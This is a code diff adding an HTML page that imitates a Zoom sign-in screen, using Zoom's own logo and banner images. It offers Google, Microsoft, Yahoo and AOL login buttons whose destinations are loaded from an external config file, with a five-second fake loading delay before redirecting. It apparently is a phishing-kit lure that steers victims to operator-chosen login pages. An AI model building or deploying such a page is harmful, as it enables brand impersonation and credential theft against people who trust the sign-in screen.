@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Zoom Sign-In Options</title>
+  <style>
+    body{font-family:Arial, sans-serif; margin:0; background:#fff; color:#333}
+    header{padding:20px}
+    header img{height:26px}
+    main{display:flex;flex-direction:column;align-items:center;padding:60px 20px}
+    h2{font-size:18px;color:#555;margin:30px 0 25px}
+    .btn{display:flex;align-items:center;justify-content:center;width:260px;margin:8px 0;padding:12px 20px;border:1px solid #ddd;border-radius:6px;text-decoration:none;font-size:16px;color:#333;background:#f9f9f9;cursor:pointer}
+    .btn img{height:20px;margin-right:10px}
+    footer{text-align:center;padding:30px 20px;font-size:14px;color:#666;border-top:1px solid #ddd}
+    .footer-banner{margin-bottom:30px;padding-bottom:30px;border-bottom:1px solid #ddd}
+    .footer-banner img{max-width:100%;height:auto}
+    #loading-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);z-index:9999;justify-content:center;align-items:center;flex-direction:column}
+    #loading-overlay.active{display:flex}
+    #loading-overlay img{width:87px;height:87px}
+  </style>
+</head>
+<body>
+
+  <header>
+    <img src="https://st2.zoom.us/static/6.3.44637/image/new/topNav/Zoom_logo.svg" alt="Zoom Logo">
+  </header>
+
+  <main>
+    <h2>Continue with</h2>
+
+    <a id="btn-google" class="btn" target="_blank" rel="noopener">
+      <img src="https://www.google.com/favicon.ico" alt="Google Logo">Google
+    </a>
+
+    <a id="btn-microsoft" class="btn" target="_blank" rel="noopener">
+      <img src="https://www.microsoft.com/favicon.ico" alt="Microsoft Logo">Microsoft
+    </a>
+
+    <a id="btn-yahoo" class="btn" target="_blank" rel="noopener">
+      <img src="https://logo.clearbit.com/yahoo.com" alt="Yahoo Logo">Yahoo
+    </a>
+
+    <a id="btn-aol" class="btn" target="_blank" rel="noopener">
+      <img src="https://www.aol.com/favicon.ico" alt="AOL Logo">AOL
+    </a>
+  </main>
+
+  <footer>
+    <div class="footer-banner">
+      <img src="https://st1.zoom.us/fe-static/fe-signup-login-active/img/banner-step-1.2faf107a.png" alt="Zoom Banner">
+    </div>
+    Zoom is protected by reCAPTCHA and the Privacy Policy and Terms of Service apply.
+  </footer>
+
+  <!-- Loading overlay -->
+  <div id="loading-overlay">
+    <img src="https://www.gstatic.com/billing-ui/images/activityindicator/quantum_spinner_multicolored_87px_ae39165462d434417c9d93122bc4315c.gif" alt="Loading...">
+  </div>
+
+  <!-- load config then assign links -->
+  <script src="env.js"></script>
+  <script>
+    (function () {
+      var cfg = window.CONFIG || {};
+      if (!cfg) return;
+      
+      var loadingOverlay = document.getElementById('loading-overlay');
+      
+      function handleButtonClick(e) {
+        e.preventDefault();
+        var targetUrl = this.href;
+        
+        if (targetUrl && targetUrl !== '#') {
+          loadingOverlay.classList.add('active');
+          
+          setTimeout(function() {
+            window.location.href = targetUrl;
+          }, 5000);
+        }
+      }
+      
+      var btnGoogle = document.getElementById('btn-google');
+      var btnMicrosoft = document.getElementById('btn-microsoft');
+      var btnYahoo = document.getElementById('btn-yahoo');
+      var btnAol = document.getElementById('btn-aol');
+      
+      btnGoogle.href = cfg.GOOGLE_URL || '#';
+      btnMicrosoft.href = cfg.MICROSOFT_URL || '#';
+      btnYahoo.href = cfg.YAHOO_URL || '#';
+      btnAol.href = cfg.AOL_URL || '#';
+      
+      btnGoogle.addEventListener('click', handleButtonClick);
+      btnMicrosoft.addEventListener('click', handleButtonClick);
+      btnYahoo.addEventListener('click', handleButtonClick);
+      btnAol.addEventListener('click', handleButtonClick);
+    })();
+  </script>
+</body>
+</html>
